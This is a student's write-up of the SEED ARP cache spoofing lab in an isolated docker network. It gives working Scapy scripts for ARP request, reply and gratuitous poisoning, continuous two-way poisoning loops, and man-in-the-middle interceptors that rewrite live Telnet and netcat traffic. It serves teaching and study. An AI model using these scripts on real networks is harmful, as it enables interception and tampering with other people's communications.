# AITM Lab 2 — ARP Cache Poisoning & MITM

**Course:** Cybersecurity Lab — **Academic Year:** 2025/2026
**Student:** Abdelrahman Sharaf

The SEED *ARP Cache Spoofing* lab, run on the docker `Labsetup-arm` environment. Each task is
worked as a discovery: **probe** the current state → **read** what the cache actually accepts →
**construct** the spoofed packet → **verify** the effect, with the reasoning behind each choice
spelled out. The point is not that the attack "works", but *why* ARP lets it work.

## Environment

Three containers on `10.9.0.0/24`, brought up with `docker compose up -d`:

| Host | Role | IP | MAC |
|------|------|----|-----|
| A | victim / client | `10.9.0.5` | `02:42:0a:09:00:05` |
| B | victim / server | `10.9.0.6` | `02:42:0a:09:00:06` |
| M | attacker | `10.9.0.105` | `02:42:0a:09:00:69` |

MACs are deterministic in this setup (last octet mirrors the IP), which is what makes the attack
easy to *prove*: any entry where B's IP shows `…:69` instead of `…:06` is M's MAC and therefore
poisoned. Each host is entered with `docker exec -it <name> bash`; the interface is `eth0`.

![Containers started](img/01_setup.png)

## Baseline (probe)

Before touching anything, establish ground truth. On each host: confirm the interface MAC with
`ip link`, show the empty cache with `arp -n`, then ping the peers once to populate legitimate
entries and re-read the cache.

- On A, after `ping 10.9.0.6` / `ping 10.9.0.105`: `10.9.0.6 → …:06`, `10.9.0.105 → …:69` (real).
- On B, after `ping 10.9.0.5` / `ping 10.9.0.105`: `10.9.0.5 → …:05`, `10.9.0.105 → …:69` (real).

This baseline is what turns a later screenshot into *evidence*: the same command, same host, one
field changed.

![A interface + empty cache](img/02_baseline_A.png)
![A cache after legit pings](img/03_baseline_A_arp.png)
![B interface + empty cache](img/04_baseline_B.png)
![B cache after legit pings](img/05_baseline_B_arp.png)
![M interface + MAC](img/06_baseline_M.png)

---

## Task 1 — ARP Cache Poisoning

**Goal for every method:** make A's entry for `10.9.0.6` flip from `…:06` (real B) to `…:69` (M),
so A believes B lives at M's MAC. All three methods are run *from M*, each as a single packet, and
each verified by re-reading A's cache. The interesting question per method is *what makes A accept
it*.

### Task 1.A — Spoofed ARP request (op=1)

A crafted **request** sent as unicast to A, but with the *sender* fields lying: `psrc = B_IP`,
`hwsrc = M_MAC`. ARP is stateless — a host processing a request harvests the sender's
`(IP, MAC)` from it, so A caches `B_IP → M_MAC`.

```python
from scapy.all import *
A_IP="10.9.0.5"; A_MAC="02:42:0a:09:00:05"; B_IP="10.9.0.6"; M_MAC="02:42:0a:09:00:69"
pkt = Ether(dst=A_MAC, src=M_MAC)/ARP(op=1, hwsrc=M_MAC, psrc=B_IP, hwdst=A_MAC, pdst=A_IP)
sendp(pkt, iface="eth0")
```

Two deliberate choices: the packet is **unicast to A** (not broadcast) so only A is poisoned, and
the **Ethernet `src` is set to `M_MAC`** — if left to the OS, A would also cache a *correct* entry
for M's own IP as a side effect, which is noise we don't want. Note the caveat: a bare request only
reliably updates an entry that A *already holds*, which is why the baseline ping (seeding A's cache
with B) matters — verify against A's populated cache, not an empty one.

![1.A — A's cache before/after (…:06 → …:69)](img/07_task1a_request.png)

### Task 1.B — Spoofed ARP reply (op=2)

Same lie, delivered as an **unsolicited reply**. The only change is `op=2`.

```python
pkt = Ether(dst=A_MAC, src=M_MAC)/ARP(op=2, hwsrc=M_MAC, psrc=B_IP, hwdst=A_MAC, pdst=A_IP)
sendp(pkt, iface="eth0")
```

Why it works even though A never asked: the ARP spec has hosts accept and cache replies
unconditionally — there's no "did I send a request for this?" check. This is the most reliable of
the three and is the method reused for the MITM in Tasks 2–3.

![1.B — A's cache before/after](img/08_task1b_reply.png)

### Task 1.C — Gratuitous ARP

A **broadcast announcement** "`10.9.0.6` is at M's MAC" (`psrc == pdst == B_IP`).

```python
pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=M_MAC)/ARP(op=1, hwsrc=M_MAC, psrc=B_IP,
                                                     hwdst="ff:ff:ff:ff:ff:ff", pdst=B_IP)
sendp(pkt, iface="eth0")
```

Gratuitous ARP exists so a host can announce its own mapping; receivers update *existing* entries
for that IP. So A's `10.9.0.6` entry flips. A detail worth stating: **B receives the broadcast but
ignores it** — the announced IP (`10.9.0.6`) is B's own, so B reads it as "someone claiming to be
me" rather than a peer update, and its cache is untouched. Only A is poisoned.

![1.C — A poisoned, B unchanged](img/09_task1c_gratuitous.png)

**Method comparison:** reply and gratuitous update caches unconditionally / on existing entries;
the request path is the fussiest (needs a pre-existing entry to be dependable). For the MITM below
the **reply** method is used because it is unconditional and easy to repeat on a timer.

---

## Task 2 — MITM on Telnet

### Step 1 — Bidirectional continuous poisoning

For a two-way MITM both caches must be poisoned: A's `10.9.0.6 → M`, **and** B's `10.9.0.5 → M`.
Two reply-based loops on M, refreshing every 5 s so the real hosts can't re-learn the truth:

```python
# poisonA.py  — tell A that B is at M
from scapy.all import *; import time
A_IP="10.9.0.5"; A_MAC="02:42:0a:09:00:05"; B_IP="10.9.0.6"; M_MAC="02:42:0a:09:00:69"
while True:
    sendp(Ether(dst=A_MAC)/ARP(op=2, psrc=B_IP, pdst=A_IP, hwsrc=M_MAC), iface="eth0")
    time.sleep(5)
```

```python
# poisonB.py  — tell B that A is at M
from scapy.all import *; import time
A_IP="10.9.0.5"; B_IP="10.9.0.6"; B_MAC="02:42:0a:09:00:06"; M_MAC="02:42:0a:09:00:69"
while True:
    sendp(Ether(dst=B_MAC)/ARP(op=2, psrc=A_IP, pdst=B_IP, hwsrc=M_MAC), iface="eth0")
    time.sleep(5)
```

Run both (`python3 poisonA.py & python3 poisonB.py &`) and verify: A shows `10.9.0.6 → …:69`,
B shows `10.9.0.5 → …:69`. A `tcpdump -i eth0 -n` on either victim shows the periodic forged
replies (`ARP, Reply 10.9.0.6 is-at …:69`).

![Both caches poisoned (A and B → …:69)](img/10_task2_poisoned.png)
![Periodic forged ARP replies (tcpdump)](img/11_task2_arp_replies.png)

### Step 2 — Interception without forwarding

With `net.ipv4.ip_forward=0` on M, ping A→B **stops**. The frames reach M (they carry M's MAC), M's
NIC accepts them, but the kernel sees the destination *IP* isn't its own and, with forwarding off,
drops them. B never hears the ping — a silent black-hole.

![ip_forward=0; A→B ping dies](img/12_task2_forward_off.png)

### Step 3 — Forwarding on, and why we don't leave it on

`net.ipv4.ip_forward=1`: the ping resumes, but two tells appear — replies arrive at **`ttl=63`**
(one hop lost crossing M) and A receives **ICMP "Redirect Host"** messages. The redirect is the
kernel on M helpfully telling A "you should reach `10.9.0.6` directly" — i.e. forwarding-on *leaks*
the MITM and nudges the victim back onto the correct path. That's precisely why, to *manipulate*
traffic, forwarding stays **off** and the sniff-and-spoof script does the relaying itself.

![ip_forward=1; ttl=63 + ICMP redirects](img/13_task2_forward_on.png)

### Step 4 — The MITM

Establish the telnet session with forwarding **on** (so the handshake completes), then switch it
**off** and start the interceptor. In SEED's raw-character telnet mode each typed key is its own
segment, so replacing every alphabetic byte with `Z` (length-preserving) rewrites keystrokes live
without desyncing the stream:

```python
#!/usr/bin/env python3
from scapy.all import *; import re
IPA="10.9.0.5"; IPB="10.9.0.6"
MACA="02:42:0a:09:00:05"; MACB="02:42:0a:09:00:06"; M_MAC="02:42:0a:09:00:69"

def spoof(pkt):
    if IP in pkt and pkt[IP].src==IPA and pkt[IP].dst==IPB and TCP in pkt and pkt[TCP].payload:
        data = bytes(pkt[TCP].payload.load)
        newdata = re.sub(rb"[a-zA-Z]", b"Z", data)          # length preserved
        newpkt = Ether(dst=MACB, src=M_MAC)/IP(src=IPA, dst=IPB)/ \
                 TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="PA",
                     seq=pkt[TCP].seq, ack=pkt[TCP].ack)/Raw(newdata)
        del newpkt[IP].chksum; del newpkt[TCP].chksum
        sendp(newpkt, iface="eth0", verbose=0)
    elif IP in pkt and pkt[IP].src==IPB and pkt[IP].dst==IPA:  # B→A relayed untouched
        newpkt = Ether(dst=MACA, src=M_MAC)/pkt[IP]
        del newpkt[IP].chksum; del newpkt[TCP].chksum
        sendp(newpkt, iface="eth0", verbose=0)

sniff(iface="eth0", filter="tcp and port 23 and not src 10.9.0.105", prn=spoof)
```

The BPF filter `not src 10.9.0.105` stops M from sniffing and re-processing its own re-injected
packets (an infinite loop otherwise). Verify on A: typed letters arrive at B (and echo back) as
`Z`, digits pass through unchanged.

![Telnet keystrokes rewritten to Z](img/14_task2_mitm.png)

---

## Task 3 — MITM on Netcat

Same poisoning and forwarding-off setup as Task 2; the payload rewrite targets a single word — the
client's name — instead of every letter. B is the server, A the client:

```
B:  nc -l -p 9090
A:  nc 10.9.0.6 9090
```

With forwarding **off**, run the interceptor on M. A→B traffic has `Abdel` swapped for an
equal-length run of `A`; B→A is relayed untouched:

```python
#!/usr/bin/env python3
from scapy.all import *
IPA="10.9.0.5"; IPB="10.9.0.6"
MACA="02:42:0a:09:00:05"; MACB="02:42:0a:09:00:06"; M_MAC="02:42:0a:09:00:69"
TOKEN=b"Abdel"; REPL=b"A"*len(TOKEN)                    # equal length keeps TCP seq/ack aligned

def spoof(pkt):
    if IP in pkt and pkt[IP].src==IPA and pkt[IP].dst==IPB and TCP in pkt and pkt[TCP].payload:
        data = bytes(pkt[TCP].payload.load)
        newdata = data.replace(TOKEN, REPL)
        newpkt = Ether(dst=MACB, src=M_MAC)/IP(src=IPA, dst=IPB)/ \
                 TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="PA",
                     seq=pkt[TCP].seq, ack=pkt[TCP].ack)/Raw(newdata)
        del newpkt[IP].chksum; del newpkt[TCP].chksum
        sendp(newpkt, iface="eth0", verbose=0)
    elif IP in pkt and pkt[IP].src==IPB and pkt[IP].dst==IPA:  # relay unchanged (fixed L2 only)
        newpkt = Ether(dst=MACA, src=M_MAC)/pkt[IP]
        del newpkt[IP].chksum; del newpkt[TCP].chksum
        sendp(newpkt, iface="eth0", verbose=0)

sniff(iface="eth0", filter="tcp and port 9090 and not src 10.9.0.105", prn=spoof)
```

**Why each decision holds up:**

- **Equal-length replacement** keeps every following TCP `seq`/`ack` valid, so the connection never
  desyncs. Replacing with a *different* length shifts all subsequent sequence numbers → the receiver
  ACKs bytes that no longer line up → the stream freezes and a fresh ARP request eventually
  re-learns the true MAC, ending the attack. (A variant that substitutes an arbitrary-length string
  hits exactly this freeze.)
- **`del …chksum`** forces scapy to recompute IP/TCP checksums after the payload edits; a stale
  checksum would be dropped by the receiver.
- **B→A branch** simply re-frames the *original* IP packet at layer 2 (`Ether/pkt[IP]`) rather than
  re-decoding and re-stacking TCP — re-stacking produces a malformed oversized frame
  (`OSError: Message too long`).

Verify: A types `Hello Abdel testing`, B displays `Hello AAAAA testing`; a line sent
B→A is unchanged.

![A sends; B receives the modified line](img/16_task3_mitm.png)

---

## Observations

- ARP accepts unsolicited replies and gratuitous announcements without any request-tracking, so a
  single crafted packet rewrites a victim's L2 mapping — the root cause is the protocol's lack of
  authentication, not any host misconfiguration.
- Kernel IP-forwarding makes the relay *work* but is not stealthy: it emits ICMP redirects and
  decrements TTL, both observable by the victim. A userland sniff-and-spoof relay (forwarding off)
  avoids both and is what enables payload modification.
- For a live TCP MITM, preserving payload length is the difference between a persistent tap and a
  one-shot that freezes the connection.
